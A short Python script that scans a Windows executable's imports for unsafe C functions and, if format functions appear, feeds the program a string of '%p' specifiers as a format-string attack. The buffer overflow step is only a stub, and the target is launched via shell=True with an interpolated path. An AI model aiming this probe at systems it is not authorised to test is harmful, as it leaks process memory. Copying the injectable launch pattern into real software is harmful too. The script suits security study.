import sys
import os
import subprocess
import pefile

target_path = ''

def validate_path():
    global target_path

    if len(sys.argv) < 2:
        print("please provide a target file")
        sys.exit(1)

    target_path = sys.argv[1]

    if not os.path.exists(target_path) or not os.path.isfile(target_path):
        print("Target file not found")
        sys.exit(1)

    print("Target located")

def change_working_dir():
    target_dir = os.path.dirname(target_path)
    os.chdir(target_dir)

def string_format_attack():
    print("Attempting string format attack")
    
    process = subprocess.Popen(f"\"{target_path}\"", stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)

    input_str = " ".join(["%p"] * 30) + "\n"
    output = process.communicate(input=input_str.encode())
    
    print(output)

def print_import_analysis_result(functions_list: list, vulnerability_name):
    print(f"\tFound {len(functions_list)} vulnerable {vulnerability_name} functions \n\t({functions_list or "None"})")

def import_analysis():
    print("Analysing PE Imports")

    buffer_overflow_functions = [
        'strcpy', 'strncpy', 'sprintf', 'vsprintf', 'gets',
        'scanf', 'fscanf', 'sscanf', 'getenv', 'streadd'
    ]
    string_format_functions = [
        'printf', 'fprintf', 'sprintf', 'vfprintf', 'vsprintf'
    ]

    found_buffer_overflow_functions = []
    found_string_format_functions = []

    pe = pefile.PE(target_path)
    target_entry = 'msvcrt.dll'

    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        if entry.dll.decode('utf-8').lower() == target_entry:
            print(f"{entry.dll.decode('utf-8')}:")
            for imp in entry.imports:
                func_name = imp.name.decode('utf-8') if imp.name else str(imp.ordinal)

                if func_name in buffer_overflow_functions:
                    found_buffer_overflow_functions.append(func_name)

                if func_name in string_format_functions:
                    found_string_format_functions.append(func_name)

    print_import_analysis_result(found_buffer_overflow_functions, "buffer overflow attack")
    print_import_analysis_result(found_string_format_functions, "string format attack")

    return len(found_buffer_overflow_functions) > 0, len(found_string_format_functions) > 0

def attempt_exploit():
    buffer_overflow, string_format = import_analysis()

    if string_format:
        string_format_attack()
    elif buffer_overflow:
        print("attempting buffer overflow attack")
    else:
        print("no exploit possible")

def main():
    validate_path()
    change_working_dir()
    attempt_exploit()

if __name__ == "__main__":
    main()
